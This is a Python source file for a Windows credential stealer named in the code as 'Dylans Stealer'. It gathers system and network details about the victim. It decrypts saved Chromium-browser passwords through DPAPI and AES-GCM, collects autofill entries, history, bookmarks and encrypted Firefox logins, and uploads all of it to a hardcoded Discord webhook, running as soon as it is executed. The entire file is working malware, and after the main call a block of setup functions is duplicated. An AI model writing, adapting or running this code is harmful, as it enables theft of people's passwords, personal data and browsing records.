import os
import re
import shutil
import random
import threading
import subprocess
import platform
import uuid
import socket
from base64 import b64decode
from json import loads, dumps
from sqlite3 import connect as sql_connect
from urllib.request import Request, urlopen
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from Crypto.Cipher import AES

# Your Discord webhook URL goes here.
h00k = "https://discord.com/api/webhooks/1380953902224113766/C6yaL5ijmaVbF5l4Cqn3sudTpkpyhj-PTcLeCgIUu9D2EGdTlk-taTvIOCgBCakLGJts"

# --- Debugging Flag ---
DEBUG_MODE = True
# --- End Debugging Flag ---


def debug_print(*args, **kwargs):
    if DEBUG_MODE:
        print("[DEBUG]", *args, **kwargs)

def get_ip():
    """Fetches the external IP address."""
    try:
        return urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except Exception as e:
        debug_print(f"Error fetching IP: {e}")
        return "None"
    
IP = get_ip()

# Define paths for local and roaming AppData
local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")

def get_global_info():
    """Gathers global system information like username and country based on IP."""
    try:
        username = os.getenv("USERNAME")
        ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{IP}")).read().decode().replace('callback(', '').replace('})', '}')
        ipdata = loads(ipdatanojson)
        country = ipdata["country_name"]
        country_code = ipdata["country_code"].lower()
        if country_code == "not found":
            global_info = f":rainbow_flag:  - `{username.upper()} | {IP} ({country})`"
        else:
            global_info = f":flag_{country_code}:  - `{username.upper()} | {IP} ({country})`"
        return global_info
    except Exception as e:
        debug_print(f"Error getting global info: {e}")
        return f":rainbow_flag:  - `{os.getenv('USERNAME').upper() if os.getenv('USERNAME') else 'UNKNOWN_USER'}`"

def get_pc_info():
    """Collects detailed PC information."""
    pc_info = []
    try:
        pc_info.append(f"**PC Username**: `{os.getenv('USERNAME')}`")
        pc_info.append(f"**Computer Name**: `{platform.node()}`")
        pc_info.append(f"**Operating System**: `{platform.system()} {platform.release()} ({platform.version()})`")
        pc_info.append(f"**Processor**: `{platform.processor()}`")
        
        # Local IP
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            pc_info.append(f"**Local IP**: `{local_ip}`")
        except Exception as e:
            debug_print(f"Error getting local IP: {e}")
            pc_info.append(f"**Local IP**: `N/A`")

        # MAC Address
        try:
            mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
            pc_info.append(f"**MAC Address**: `{mac}`")
        except Exception as e:
            debug_print(f"Error getting MAC address: {e}")
            pc_info.append(f"**MAC Address**: `N/A`")
            
    except Exception as e:
        debug_print(f"Error gathering PC info: {e}")
        pc_info.append("**PC Info**: `Failed to retrieve`")
    return "\n".join(pc_info)

PC_INFO = get_pc_info()

class DATA_BLOB(Structure):
    """Structure for Windows DPAPI data blob."""
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]

# Global counters for summary
password_count, autofill_count, history_count, bookmark_count = 0, 0, 0, 0

# Global lists to accumulate content from all browsers for each data type
all_passwords_content = []
all_autofill_content = []
all_history_content = []
all_bookmarks_content = []


GLOBAL_INFO = get_global_info()

def load_url(hook_url, data='', headers=''):
    """Sends HTTP requests, used for Discord webhooks."""
    for i in range(8): # Retry up to 8 times
        try:
            req = Request(hook_url, data=data, headers=headers)
            with urlopen(req) as r:
                debug_print(f"Webhook response status: {r.status}")
                debug_print(f"Webhook response reason: {r.reason}")
            return r
        except Exception as e: # Catch any exception and retry
           debug_print(f"Error sending webhook (attempt {i+1}): {e}")
           pass
    debug_print("Failed to send webhook after multiple attempts.")


def get_data_from_blob(blob_out):
    """Retrieves data from a CryptUnprotectData blob."""
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def CryptUnprotectData(encrypted_bytes, entropy=b''):
    """Decrypts data using Windows DPAPI."""
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return get_data_from_blob(blob_out)
    return None # Return None if decryption fails

def decrypt_value(buff, master_key=None):
    """
    Decrypts encrypted values (e.g., passwords) using AES GCM.
    Handles 'v10' and 'v11' prefixes.
    NOTE: 'v20' is a newer encryption format used by some Chromium browsers and is NOT SUPPORTED
    by this script's current decryption capabilities. These entries will be flagged.
    """
    if not master_key or not buff:
        return "<DECRYPTION_ERROR: MISSING KEY/BUFFER>"
    
    if len(buff) < 15: # Minimum length for 'v10'/'v11' + IV + some payload
        debug_print(f"  [DECRYPT_VALUE] Buffer too short for v10/v11 format. Length: {len(buff)}")
        return "<DECRYPTION_ERROR: BUFFER_TOO_SHORT>"

    starts = buff[0:3].decode(encoding='utf8', errors='ignore')
    
    if starts == 'v10' or starts == 'v11':
        try:
            iv = buff[3:15]
            payload = buff[15:]
            
            if len(payload) < 16: # Payload must be at least 16 bytes for auth tag
                debug_print(f"  [DECRYPT_VALUE] Payload too short to contain auth tag. Length: {len(payload)}")
                return "<DECRYPTION_ERROR: PAYLOAD_TOO_SHORT>"

            ciphertext = payload[:-16]
            auth_tag = payload[-16:]

            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt_and_verify(ciphertext, auth_tag)
            
            try: 
                return decrypted_pass.decode('utf-8', errors='ignore')
            except Exception as e:
                debug_print(f"  [DECRYPT_VALUE] Error decoding decrypted value: {e}")
                return str(decrypted_pass) # Return as string representation of bytes if decoding fails
        except ValueError as ve: # Specific error for tag verification failure
            debug_print(f"  [DECRYPT_VALUE] AES decryption failed (Tag verification error): {ve}")
            return "<DECRYPTION_ERROR: AES_TAG_FAILED>"
        except Exception as e:
            debug_print(f"  [DECRYPT_VALUE] AES decryption failed: {e}")
            return "<DECRYPTION_ERROR: AES_FAILED>"
    elif starts == 'v20':
        debug_print(f"  [DECRYPT_VALUE] Detected 'v20' encryption format. This format is currently UNSUPPORTED for decryption by this script.")
        return "<DECRYPTION_ERROR: V20_FORMAT_UNSUPPORTED>"
    else:
        debug_print(f"  [DECRYPT_VALUE] Unknown encryption format. Starts: {starts}")
        return "<DECRYPTION_ERROR: UNKNOWN_FORMAT>"
       
def write_to_file(data_list, name):
    """Writes a list of strings to a specified text file in the TEMP directory."""
    path = os.path.join(temp, f"cr{name}.txt") # Use os.path.join for cross-platform compatibility
    try:
        with open(path, mode='w', encoding='utf-8') as f:
            for line in data_list:
                f.write(f"{line}\n")
        debug_print(f"Successfully wrote {len(data_list)} lines to {path}")
    except Exception as e:
        debug_print(f"Error writing file {path}: {e}")
    return path # Return the full path of the created file

def sqlite_query(path_db, temp_file_path, cmd):
    """
    Copies a SQLite database, executes a query, fetches data, and cleans up.
    Used for extracting data from browser databases.
    """
    try:
        # Attempt to remove the temp file if it exists from a previous failed run
        if os.path.exists(temp_file_path):
            os.remove(temp_file_path)
            debug_print(f"Removed stale temp DB: {temp_file_path}")

        shutil.copy2(path_db, temp_file_path) # Copy the database to a temporary location
        conn = sql_connect(temp_file_path)
        cursor = conn.cursor()
        cursor.execute(cmd)
        data = cursor.fetchall()
        cursor.close()
        conn.close()
        os.remove(temp_file_path) # Delete the temporary database copy
        debug_print(f"SQL query successful for {path_db}. Found {len(data)} rows.")
        return data
    except Exception as e:
        debug_print(f"Error executing SQL on {path_db}: {e}. Ensure browser is closed or file is accessible.")
        if os.path.exists(temp_file_path):
            try:
                os.remove(temp_file_path)
            except Exception as e_clean:
                debug_print(f"Error during temp file cleanup after SQL error: {e_clean}")
        return []

def get_master_key(base_path, master_key_rel_path, browser_name, profile_path):
    """Retrieves and decrypts the master key for Chromium-based browsers."""
    path_master_key = os.path.join(base_path, master_key_rel_path)
    if not os.path.exists(path_master_key):
        debug_print(f"  Local State path does not exist for master key: {path_master_key}")
        return None
    
    try:
        with open(path_master_key, 'r', encoding='utf-8') as f: 
            local_state = loads(f.read())
        master_key_b64 = local_state.get('os_crypt', {}).get('encrypted_key')
        if not master_key_b64:
            debug_print(f"  Encrypted master key not found in Local State: {path_master_key}")
            return None
        
        # Base64 decode and remove the 'DPAPI' prefix (b'DFS9' or 'v10'/v20 specific prefixes)
        # Typically, the first 5 bytes are 'DPAPI' indicator, then the actual encrypted key.
        master_key_encrypted_data = b64decode(master_key_b64)
        if master_key_encrypted_data.startswith(b'DPAPI'):
            master_key = CryptUnprotectData(master_key_encrypted_data[5:])
        elif len(master_key_encrypted_data) > 3 and master_key_encrypted_data[0:3].decode(errors='ignore') in ['v10', 'v11', 'v20']:
             # This is a newer format for the master key itself, try to unprotect it
             # Even if the content is v10/v11/v20, the master key *itself* should be DPAPI protected
             # If it's not starting with DPAPI it's usually an error or a different encryption for the master key
             debug_print(f"  [MASTER_KEY_DECRYPT] Master key itself does not start with 'DPAPI'. Attempting DPAPI decryption after prefix (e.g. v10, v11, v20).")
             master_key = CryptUnprotectData(master_key_encrypted_data[3:]) 
        else:
            debug_print(f"  [MASTER_KEY_DECRYPT] Unexpected master key encryption format prefix: {master_key_encrypted_data[:10]}...")
            master_key = None 

        if not master_key:
            debug_print(f"  Failed to decrypt master key for {browser_name} ({profile_path}).")
            return None
        debug_print(f"  Master key successfully decrypted for {browser_name} ({profile_path}).")
        return master_key
    except Exception as mk_err:
        debug_print(f"  Error loading/decrypting master key for {browser_name} ({profile_path}): {mk_err}")
        return None

def get_chromium_passwords(base_path, master_key_rel_path, profile_path, browser_name):
    """Extracts passwords from a Chromium-based browser's login data for a specific profile."""
    global password_count
    passwords_for_browser = []
    
    path_login_data = os.path.join(base_path, profile_path, "Login Data")
    debug_print(f"Attempting to extract Passwords from {browser_name} ({profile_path}) at {path_login_data}")
    
    if not os.path.exists(path_login_data):
        debug_print(f"  Login Data path does not exist: {path_login_data}")
        return []
    if os.stat(path_login_data).st_size == 0:
        debug_print(f"  Login Data file is empty: {path_login_data}")
        return []

    master_key = get_master_key(base_path, master_key_rel_path, browser_name, profile_path)
    if not master_key:
        debug_print(f"  Skipping password extraction for {browser_name} ({profile_path}) due to master key decryption failure.")
        return []

    try:
        temp_db_file = os.path.join(temp, "cr_pass" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db")
        data = sqlite_query(path_login_data, temp_db_file, "SELECT action_url, username_value, password_value FROM logins;")
        
        if not data: 
            debug_print(f"  Found 0 raw password entries for {browser_name} ({profile_path}).")
            return []

        browser_pass_decrypted_count = 0
        browser_pass_total_found_count = 0
        passwords_for_browser.append(f"\n--- Passwords from {browser_name} ({profile_path}) ---")
        for row in data:
            if row[0] and row[1]: # Ensure URL and Username are not empty
                decrypted_password = decrypt_value(row[2], master_key)
                browser_pass_total_found_count += 1
                if not decrypted_password.startswith("<DECRYPTION_ERROR:"):
                    passwords_for_browser.append(f"URL: {row[0]} | USERNAME: {row[1]} | PASSWORD: {decrypted_password}")
                    password_count += 1 # Increment global counter for successfully decrypted items
                    browser_pass_decrypted_count += 1
                else:
                    passwords_for_browser.append(f"URL: {row[0]} | USERNAME: {row[1]} | PASSWORD: {decrypted_password}") # Show decryption error in output
                    debug_print(f"  Password decryption failed for {row[0]}: {decrypted_password}") # More specific debug

        passwords_for_browser.append(f"--- {browser_pass_decrypted_count} passwords decrypted out of {browser_pass_total_found_count} found in {browser_name} ({profile_path}) ---")
        debug_print(f"  Finished Passwords for {browser_name} ({profile_path}). Decrypted: {browser_pass_decrypted_count}, Total Found: {browser_pass_total_found_count}. Global Decrypted Total: {password_count}")
    except Exception as e:
        debug_print(f"Error in get_chromium_passwords for {browser_name} ({profile_path}): {e}")
    return passwords_for_browser


def get_chromium_autofill(base_path, profile_path, browser_name):
    """Extracts autofill data from a Chromium-based browser's web data for a specific profile."""
    global autofill_count
    autofill_for_browser = []
    path_web_data = os.path.join(base_path, profile_path, "Web Data")
    debug_print(f"Attempting to extract Autofill from {browser_name} ({profile_path}) at {path_web_data}")
    if not os.path.exists(path_web_data):
        debug_print(f"  Web Data path for Autofill does not exist: {path_web_data}")
        return []
    if os.stat(path_web_data).st_size == 0:
        debug_print(f"  Web Data file for Autofill is empty: {path_web_data}")
        return []
    try:
        temp_db_file = os.path.join(temp, "cr_auto" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db")
        data = sqlite_query(path_web_data, temp_db_file,"SELECT name, value FROM autofill WHERE value NOT NULL;")
        if not data: return []
        browser_autofill_count = 0
        autofill_for_browser.append(f"\n--- Autofill Data from {browser_name} ({profile_path}) ---")
        for row in data:
            if row[0]:
                autofill_for_browser.append(f"NAME: {row[0]} | VALUE: {row[1]}")
                autofill_count += 1
                browser_autofill_count += 1
        autofill_for_browser.append(f"--- {browser_autofill_count} autofills found in {browser_name} ({profile_path}) ---")
        debug_print(f"  Finished Autofill for {browser_name} ({profile_path}). Found {browser_autofill_count} items. Total: {autofill_count}")
    except Exception as e:
        debug_print(f"Error in get_chromium_autofill for {browser_name} ({profile_path}): {e}")
    return autofill_for_browser

def get_chromium_history(base_path, profile_path, browser_name):
    """Extracts Browse history from a Chromium-based browser's history database for a specific profile."""
    global history_count
    history_for_browser = []
    path_history = os.path.join(base_path, profile_path, "History")
    debug_print(f"Attempting to extract History from {browser_name} ({profile_path}) at {path_history}")
    if not os.path.exists(path_history):
        debug_print(f"  History path does not exist: {path_history}")
        return []
    if os.stat(path_history).st_size == 0:
        debug_print(f"  History file is empty: {path_history}")
        return []
    try:
        temp_db_file = os.path.join(temp, "cr_hist" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db")
        data = sqlite_query(path_history, temp_db_file,"SELECT url FROM urls;")
        if not data: return []
        browser_history_count = 0
        history_for_browser.append(f"\n--- Browse History from {browser_name} ({profile_path}) ---")
        for row in data:
            if row[0]:
                history_for_browser.append(row[0])
                history_count += 1
                browser_history_count += 1
        history_for_browser.append(f"--- {browser_history_count} history entries found in {browser_name} ({profile_path}) ---")
        debug_print(f"  Finished History for {browser_name} ({profile_path}). Found {browser_history_count} items. Total: {history_count}")
    except Exception as e:
        debug_print(f"Error in get_chromium_history for {browser_name} ({profile_path}): {e}")
    return history_for_browser

def get_chromium_bookmarks(base_path, profile_path, browser_name):
    """Extracts bookmarks from a Chromium-based browser's bookmarks file for a specific profile."""
    global bookmark_count
    bookmarks_for_browser = []
    path_bookmarks = os.path.join(base_path, profile_path, "Bookmarks")
    debug_print(f"Attempting to extract Bookmarks from {browser_name} ({profile_path}) at {path_bookmarks}")
    if not os.path.exists(path_bookmarks):
        debug_print(f"  Bookmarks path does not exist: {path_bookmarks}")
        return []
    if os.stat(path_bookmarks).st_size == 0:
        debug_print(f"  Bookmarks file is empty: {path_bookmarks}")
        return []
    try:
        browser_bookmark_count = 0
        with open(path_bookmarks, 'r', encoding='utf8', errors='ignore') as f:
            data = loads(f.read())
            if data and 'roots' in data and 'bookmark_bar' in data['roots'] and 'children' in data['roots']['bookmark_bar']:
                bookmarks_for_browser.append(f"\n--- Bookmarks from {browser_name} ({profile_path}) ---")
                for i in data['roots']['bookmark_bar']['children']:
                    try:
                        if 'name' in i and 'url' in i:
                            bookmarks_for_browser.append(f"NAME: {i['name']} | URL: {i['url']}")
                            bookmark_count += 1
                            browser_bookmark_count += 1
                    except Exception as e:
                        debug_print(f"  Error processing bookmark entry for {browser_name} ({profile_path}): {e}")
                bookmarks_for_browser.append(f"--- {browser_bookmark_count} bookmarks found in {browser_name} ({profile_path}) ---")
        debug_print(f"  Finished Bookmarks for {browser_name} ({profile_path}). Found {browser_bookmark_count} items. Total: {bookmark_count}")
    except Exception as e:
        debug_print(f"Error in get_chromium_bookmarks for {browser_name} ({profile_path}): {e}")
    return bookmarks_for_browser


def get_firefox_passwords(base_path, browser_name="Firefox"):
    global password_count
    passwords_for_browser = []
    debug_print(f"Attempting to extract Passwords from {browser_name} at {base_path}")
    try:
        profiles_ini_path = os.path.join(base_path, "profiles.ini")
        if not os.path.exists(profiles_ini_path):
            debug_print(f"  profiles.ini not found for Firefox: {profiles_ini_path}")
            return []

        profile_paths = []
        with open(profiles_ini_path, 'r', encoding='utf-8') as f:
            profiles_content = f.read()
            matches = re.findall(r"Path=(.*?)\n", profiles_content)
            for match in matches:
                full_profile_path = os.path.join(base_path, match)
                if os.path.exists(full_profile_path) and os.path.isdir(full_profile_path):
                    profile_paths.append(full_profile_path)
        
        if not profile_paths:
            debug_print(f"  Could not find any profile paths in profiles.ini for Firefox.")
            return []

        for profile_path in profile_paths:
            debug_print(f"  Processing Firefox profile: {profile_path}")
            
            logins_json_path = os.path.join(profile_path, "logins.json")
            if not os.path.exists(logins_json_path):
                debug_print(f"  Firefox logins.json not found for profile: {logins_json_path}")
                continue
            if os.stat(logins_json_path).st_size == 0:
                debug_print(f"  Firefox logins.json file is empty: {logins_json_path}")
                continue

            browser_pass_count = 0
            passwords_for_browser.append(f"\n--- Passwords from {browser_name} ({os.path.basename(profile_path)}) ---")
            
            with open(logins_json_path, 'r', encoding='utf-8') as f:
                logins_data = loads(f.read())
                for login in logins_data.get('logins', []):
                    hostname = login.get('hostname', 'N/A')
                    username = login.get('encryptedUsername', 'N/A')
                    password = login.get('encryptedPassword', 'N/A')

                    # Note: Full Firefox password decryption requires external libraries (like `nss` for Python)
                    # and more complex logic involving NSS database interaction.
                    passwords_for_browser.append(f"URL: {hostname} | USERNAME (Encrypted): {username} | PASSWORD (Encrypted): {password} [Requires NSS Decryption]")
                    # We count these as "found" but note that they are not decrypted by this script.
                    password_count += 1 
                    browser_pass_count += 1
                    
            passwords_for_browser.append(f"--- {browser_pass_count} passwords found (encrypted) in {browser_name} ({os.path.basename(profile_path)}) ---")
            debug_print(f"  Finished Passwords for {browser_name} ({os.path.basename(profile_path)}). Found {browser_pass_count} items (encrypted).")

    except Exception as e:
        debug_print(f"Error in get_firefox_passwords for {browser_name}: {e}")
    return passwords_for_browser

# --- Main orchestrator function ---

def get_browsers_data(browser_paths_config):
    """
    Main function to orchestrate browser data extraction, consolidation,
    Discord webhook sending, and file cleanup.
    """
    global password_count, autofill_count, history_count, bookmark_count
    global all_passwords_content, all_autofill_content, all_history_content, all_bookmarks_content

    debug_print("\n--- Starting Data Collection for Dylans Stealer ---")
    # Reset counters and content lists for a fresh execution
    password_count, autofill_count, history_count, bookmark_count = 0, 0, 0, 0
    all_passwords_content.clear()
    all_autofill_content.clear()
    all_history_content.clear()
    all_bookmarks_content.clear()

    # Process Browsers
    for patt in browser_paths_config:
        base_path = patt[0]
        master_key_rel_path = patt[2] # For Chromium

        # Determine a user-friendly browser name
        browser_name = "Unknown Browser"
        if "Opera Software" in base_path:
            if "Opera GX Stable" in base_path: browser_name = "Opera GX"
            elif "Opera Stable" in base_path: browser_name = "Opera"
            elif "Opera Neon" in base_path: browser_name = "Opera Neon"
        elif "Google" in base_path:
            if "Chrome/User Data" in base_path: browser_name = "Chrome"
            elif "Chrome SxS" in base_path: browser_name = "Chrome SxS"
            elif "Chrome Beta" in base_path: browser_name = "Chrome Beta"
            elif "Chrome Dev" in base_path: browser_name = "Chrome Dev"
            elif "Chrome Unstable" in base_path: browser_name = "Chrome Unstable"
            elif "Chrome Canary" in base_path: browser_name = "Chrome Canary"
        elif "BraveSoftware" in base_path: browser_name = "Brave"
        elif "Vivaldi" in base_path: browser_name = "Vivaldi"
        elif "Yandex" in base_path: browser_name = "Yandex"
        elif "Microsoft/Edge" in base_path: browser_name = "Edge"
        elif "Mozilla/Firefox" in base_path: browser_name = "Firefox"

        debug_print(f"\n--- Processing Browser: {browser_name} ({base_path}) ---")
        
        if browser_name == "Firefox":
            all_passwords_content.extend(get_firefox_passwords(base_path, browser_name))
            # Note: Firefox Autofill, History, Bookmarks require different parsing methods
            # and are not included in this general Chromium-focused script.
        else: # Chromium-based browsers
            user_data_path_candidate = os.path.join(base_path, "User Data")
            profile_search_root = user_data_path_candidate if os.path.exists(user_data_path_candidate) else base_path

            # Dynamically find profile folders within the user data directory
            profile_folders = []
            if os.path.exists(profile_search_root):
                for item in os.listdir(profile_search_root):
                    full_item_path = os.path.join(profile_search_root, item)
                    # Check if it's a directory and likely a profile folder
                    if os.path.isdir(full_item_path) and (item == "Default" or item.startswith("Profile ") or item == "Guest Profile"):
                        profile_folders.append(item)
            
            if not profile_folders:
                debug_print(f"  No valid profile folders found for {browser_name} at {profile_search_root}. Attempting 'Default' directly.")
                profile_folders.append("Default") # Always try "Default" as a fallback

            for profile_folder in profile_folders:
                debug_print(f"  Processing Chromium profile: {profile_folder}")
                all_passwords_content.extend(get_chromium_passwords(profile_search_root, master_key_rel_path, profile_folder, browser_name))
                all_autofill_content.extend(get_chromium_autofill(profile_search_root, profile_folder, browser_name))
                all_history_content.extend(get_chromium_history(profile_search_root, profile_folder, browser_name))
                all_bookmarks_content.extend(get_chromium_bookmarks(profile_search_root, profile_folder, browser_name))

    debug_print("\n--- Finished Data Collection ---")
    debug_print(f"Total Passwords (Decrypted) found: {password_count}")
    debug_print(f"Total Autofills found: {autofill_count}")
    debug_print(f"Total Histories found: {history_count}")
    debug_print(f"Total Bookmarks found: {bookmark_count}")


    # After processing all browsers, write accumulated data to consolidated files
    file_paths_to_attach = []
    if all_passwords_content: file_paths_to_attach.append(write_to_file(all_passwords_content, 'passwords'))
    if all_autofill_content: file_paths_to_attach.append(write_to_file(all_autofill_content, 'autofill'))
    if all_history_content: file_paths_to_attach.append(write_to_file(all_history_content, 'history'))
    if all_bookmarks_content: file_paths_to_attach.append(write_to_file(all_bookmarks_content, 'bookmarks'))


    debug_print(f"Files generated for attachment: {file_paths_to_attach}")


    # Prepare the Discord payload with summary embed
    summary_embed = {
        "title": "Dylans Stealer | Browser Data Summary",
        "description": (
            f"<a:hira_kasaanahtari:886942856969875476> • **{password_count}** Browser Passwords Decrypted (Note: Some may be encrypted with unsupported format like v20)\n"
            f"<a:hira_kasaanahtari:886942856969875476> • **{autofill_count}** Browser Autofills Found\n"
            f":newspaper:  • **{history_count}** Browser Histories Found\n"
            f":bookmark: • **{bookmark_count}** Browser Bookmarks Found\n"
        ),
        "color": 16711680, # A nice, fiery red for impact
        "footer": {"text": f"Dylans Stealer | Data from {GLOBAL_INFO.split('`')[1]}",  
                   "icon_url": "https://i.imgur.com/jJES3AX.png"}
    }
    
    # All embeds combined into one list
    main_embeds = [summary_embed]
    
    # --- Construct the full multipart payload for Discord ---
    BOUNDARY = '----WebKitFormBoundary' + ''.join(random.choice('0123456789abcdef') for _ in range(16))
    full_multipart_payload = b''

    # Add the JSON payload part (for embeds and general content)
    json_payload_data = {
        "content": f"{GLOBAL_INFO}\n\n{PC_INFO}",
        "embeds": main_embeds,
        "username": f"Dylans Stealer",
        "avatar_url": "https://i.imgur.com/jJES3AX.png"
    }
    json_payload_bytes = dumps(json_payload_data).encode('utf-8')
    full_multipart_payload += (
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="payload_json"\r\n'
        f'Content-Type: application/json\r\n\r\n'
    ).encode('utf-8') + json_payload_bytes + b'\r\n'

    # Add each file as a separate part in the multipart payload
    for idx, f_path in enumerate(file_paths_to_attach):
        file_name = os.path.basename(f_path)
        try:
            # Check if file exists and is not empty before attaching
            if os.path.exists(f_path) and os.stat(f_path).st_size > 0:
                with open(f_path, 'rb') as f:
                    file_content = f.read()

                full_multipart_payload += (
                    f"--{BOUNDARY}\r\n"
                    f'Content-Disposition: form-data; name="file{idx}"; filename="{file_name}"\r\n'
                    f'Content-Type: application/octet-stream\r\n\r\n'
                ).encode('utf-8') + file_content + b'\r\n'
                debug_print(f"Attached file: {file_name} (Size: {os.stat(f_path).st_size} bytes)")
            else:
                debug_print(f"Skipping attachment of empty/non-existent file: {file_name}")
        except Exception as e:
            debug_print(f"Error attaching file {file_name}: {e}")
            pass # If a file cannot be read, simply skip it silently

    full_multipart_payload += f"--{BOUNDARY}--\r\n".encode('utf-8')

    # Set headers for the multipart request
    multipart_headers = {
        "Content-Type": f"multipart/form-data; boundary={BOUNDARY}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    debug_print(f"\n--- Sending Webhook for Dylans Stealer ---")
    load_url(h00k, data=full_multipart_payload, headers=multipart_headers)
    debug_print(f"--- Webhook Sending Attempt Complete ---")

    # --- Cleanup Section: Erase the temporary files ---
    debug_print("\n--- Starting Cleanup ---")
    for file_name_base in ['passwords', 'autofill', 'history', 'bookmarks']:
        file_path = os.path.join(temp, f"cr{file_name_base}.txt")
        if os.path.exists(file_path):
            try:
                # os.remove(file_path) # Uncomment this line to delete temporary files after use
                debug_print(f"Kept temporary file: {file_path}") # For debugging, keeping files.
            except Exception as e:
                debug_print(f"Error handling file {file_path}: {e}")
        else:
            debug_print(f"Temporary file not found (not created): {file_path}")
    debug_print("--- Cleanup Complete ---")

    return

# Call the main data gathering function
def gather_all():
    """Defines browser paths and initiates the data gathering process."""
    # New proposed structure for browser_paths_config:
    # [0: base_path, 1: exe_name, 2: master_key_rel_path]
    # master_key_rel_path: Path to Local State relative to base_path (for Chromium)
    # For Firefox, master_key_rel_path is not directly applicable.
    browser_paths_config = [
        # Chromium-based Browsers - base_path points to the "User Data" equivalent
        # For Opera, the Local State is directly under AppData/Roaming/Opera Software/Opera GX Stable, etc.
        [f"{roaming}/Opera Software/Opera GX Stable", "opera.exe", "Local State"],
        [f"{roaming}/Opera Software/Opera Stable", "opera.exe", "Local State"],
        # Opera Neon typically has User Data subfolder
        [f"{roaming}/Opera Software/Opera Neon/User Data", "opera.exe", "Local State"],
        # Google Chrome
        [f"{local}/Google/Chrome/User Data", "chrome.exe", "Local State"],
        [f"{local}/Google/Chrome SxS/User Data", "chrome.exe", "Local State"],
        [f"{local}/Google/Chrome Beta/User Data", "chrome.exe", "Local State"],
        [f"{local}/Google/Chrome Dev/User Data", "chrome.exe", "Local State"],
        [f"{local}/Google/Chrome Unstable/User Data", "chrome.exe", "Local State"],
        [f"{local}/Google/Chrome Canary/User Data", "chrome.exe", "Local State"],
        # Brave
        [f"{local}/BraveSoftware/Brave-Browser/User Data", "brave.exe", "Local State"],
        # Vivaldi
        [f"{local}/Vivaldi/User Data", "vivaldi.exe", "Local State"],
        # Yandex
        [f"{local}/Yandex/YandexBrowser/User Data", "yandex.exe", "Local State"],
        [f"{local}/Yandex/YandexBrowserCanary/User Data", "yandex.exe", "Local State"],
        [f"{local}/Yandex/YandexBrowserDeveloper/User Data", "yandex.exe", "Local State"],
        [f"{local}/Yandex/YandexBrowserBeta/User Data", "yandex.exe", "Local State"],
        [f"{local}/Yandex/YandexBrowserTech/User Data", "yandex.exe", "Local State"],
        [f"{local}/Yandex/YandexBrowserSxS/User Data", "yandex.exe", "Local State"],
        # Microsoft Edge
        [f"{local}/Microsoft/Edge/User Data", "edge.exe", "Local State"],
        # Firefox (base_path points to the directory containing profiles.ini)
        [f"{roaming}/Mozilla/Firefox", "firefox.exe", ""], # Master key path not directly used for Firefox
    ]

    get_browsers_data(browser_paths_config) # Initiate the data gathering

gather_all() # Initiate the malevolent process
# --- End Debugging Flag ---


def debug_print(*args, **kwargs):
    if DEBUG_MODE:
        print("[DEBUG]", *args, **kwargs)

def get_ip():
    """Fetches the external IP address."""
    try:
        return urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except Exception as e:
        debug_print(f"Error fetching IP: {e}")
        return "None"
    
IP = get_ip()

# Define paths for local and roaming AppData
local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")

def get_global_info():
    """Gathers global system information like username and country based on IP."""
    try:
        username = os.getenv("USERNAME")
        ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{IP}")).read().decode().replace('callback(', '').replace('})', '}')
        ipdata = loads(ipdatanojson)
        country = ipdata["country_name"]
        country_code = ipdata["country_code"].lower()
        if country_code == "not found":
            global_info = f":rainbow_flag:  - `{username.upper()} | {IP} ({country})`"
        else:
            global_info = f":flag_{country_code}:  - `{username.upper()} | {IP} ({country})`"
        return global_info
    except Exception as e:
        debug_print(f"Error getting global info: {e}")
        return f":rainbow_flag:  - `{os.getenv('USERNAME').upper() if os.getenv('USERNAME') else 'UNKNOWN_USER'}`"

def get_pc_info():
    """Collects detailed PC information."""
    pc_info = []
    try:
        pc_info.append(f"**PC Username**: `{os.getenv('USERNAME')}`")
        pc_info.append(f"**Computer Name**: `{platform.node()}`")
        pc_info.append(f"**Operating System**: `{platform.system()} {platform.release()} ({platform.version()})`")
        pc_info.append(f"**Processor**: `{platform.processor()}`")
        
        # Local IP
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            pc_info.append(f"**Local IP**: `{local_ip}`")
        except Exception as e:
            debug_print(f"Error getting local IP: {e}")
            pc_info.append(f"**Local IP**: `N/A`")

        # MAC Address
        try:
            mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
            pc_info.append(f"**MAC Address**: `{mac}`")
        except Exception as e:
            debug_print(f"Error getting MAC address: {e}")
            pc_info.append(f"**MAC Address**: `N/A`")
            
    except Exception as e:
        debug_print(f"Error gathering PC info: {e}")
        pc_info.append("**PC Info**: `Failed to retrieve`")
    return "\n".join(pc_info)

PC_INFO = get_pc_info()

